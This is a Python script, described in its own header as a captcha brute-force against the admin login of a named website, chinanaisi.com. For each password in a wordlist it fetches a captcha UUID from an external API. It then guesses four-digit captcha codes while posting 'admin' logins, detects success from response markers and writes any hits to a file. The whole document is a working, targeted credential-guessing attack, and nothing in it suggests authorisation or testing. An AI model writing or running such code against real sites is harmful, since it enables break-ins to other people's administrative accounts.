#!/usr/bin/env python3
# chinanaisi.com captcha brute-force - simplified
# 50 codes per password (0000-0049), timeout=8, flush after every print

import urllib.request
import urllib.parse
import urllib.error
import json
import sys
import time

CAPTCHA_URL = "https://api.myxypt.com/captcha"
LOGIN_URL = "http://chinanaisi.com/admin/login.php"
PWFILE = "/tmp/pwds.txt"
USERNAME = "admin"
CAPTCHA_RANGE = range(0, 50)
TIMEOUT = 8
PROGRESS_INTERVAL = 10
HIT_FILE = "/tmp/CN_HIT.txt"

SUCCESS_MARKERS = ["parent.location", "top.location", "管理中心"]


def read_passwords(filepath):
    passwords = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if pw:
                    passwords.append(pw)
    except FileNotFoundError:
        print(f"[!] Password file not found: {filepath}", flush=True)
        sys.exit(1)
    return passwords


def get_captcha_uuid():
    req = urllib.request.Request(CAPTCHA_URL + "?width=140&height=48")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    req.add_header("Accept", "application/json, text/plain, */*")
    try:
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        raw_body = response.read()
        data = json.loads(raw_body.decode("utf-8", errors="ignore"))
        uuid_val = data.get("data", {}).get("uuid", None)
        return uuid_val
    except Exception as e:
        print(f"[!] Failed to get captcha UUID: {e}", flush=True)
        return None


def try_login(uuid_val, password, captcha):
    post_data = urllib.parse.urlencode({
        "action": "loginpost",
        "uuid": uuid_val,
        "loginId": "",
        "username": USERNAME,
        "password": password,
        "checkcode": captcha,
    }).encode("utf-8")

    req = urllib.request.Request(LOGIN_URL, data=post_data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    req.add_header("Accept", "text/html,application/xhtml+xml,*/*")
    req.add_header("Origin", "http://chinanaisi.com")
    req.add_header("Referer", "http://chinanaisi.com/admin/login.php")

    try:
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        raw_body = response.read()
        try:
            body_text = raw_body.decode("gb2312", errors="ignore")
        except Exception:
            body_text = raw_body.decode("utf-8", errors="ignore")

        body_lower = body_text.lower()
        for marker in SUCCESS_MARKERS:
            if marker.lower() in body_lower:
                return "SUCCESS"

        if "密码" in body_text and "验证码" not in body_text:
            return "CODE_OK"

        return None
    except Exception:
        return None


def main():
    passwords = read_passwords(PWFILE)
    total_passwords = len(passwords)
    codes_per_pw = len(CAPTCHA_RANGE)
    total_attempts = total_passwords * codes_per_pw

    print(f"[*] Passwords file: {PWFILE}", flush=True)
    print(f"[*] Password count: {total_passwords}", flush=True)
    print(f"[*] Codes per password: {codes_per_pw}", flush=True)
    print(f"[*] Total attempts: {total_attempts}", flush=True)
    print(f"[*] Captcha API: {CAPTCHA_URL}", flush=True)
    print(f"[*] Login URL: {LOGIN_URL}", flush=True)
    print(f"[*] Username: {USERNAME}", flush=True)
    print(f"[*] Starting...", flush=True)
    sys.stdout.flush()

    attempt = 0

    for pw_idx, password in enumerate(passwords):
        uuid_val = get_captcha_uuid()
        if uuid_val is None:
            print(f"[!] Skip password [{pw_idx+1}/{total_passwords}]: {password!r}", flush=True)
            continue

        print(f"[*] PW[{pw_idx+1}/{total_passwords}]: {password} | UUID: {uuid_val}", flush=True)

        for code_int in CAPTCHA_RANGE:
            captcha = f"{code_int:04d}"
            attempt += 1

            result = try_login(uuid_val, password, captcha)

            if result == "SUCCESS":
                msg = (
                    f"\n{'='*60}\n"
                    f"[!!!] LOGIN SUCCESS!!!\n"
                    f"[!!!] Password: {password}\n"
                    f"[!!!] Captcha: {captcha}\n"
                    f"[!!!] UUID: {uuid_val}\n"
                    f"[!!!] Attempt: {attempt}\n"
                    f"{'='*60}\n"
                )
                print(msg, flush=True)
                with open(HIT_FILE, "a") as hf:
                    hf.write(msg)
                    hf.flush()
                break
            elif result == "CODE_OK":
                print(f"  CODE_OK | password={password} | captcha={captcha} | attempt={attempt}", flush=True)
                break

            if attempt % PROGRESS_INTERVAL == 0:
                pct = (attempt / total_attempts) * 100
                print(f"  [PROGRESS] {attempt}/{total_attempts} ({pct:.1f}%) | pw[{pw_idx+1}/{total_passwords}]: {password} | code: {captcha}", flush=True)
        else:
            print(f"  [*] No correct captcha found for {password!r}", flush=True)

    print(f"\n[*] Done. Total attempts: {attempt}", flush=True)


if __name__ == "__main__":
    main()
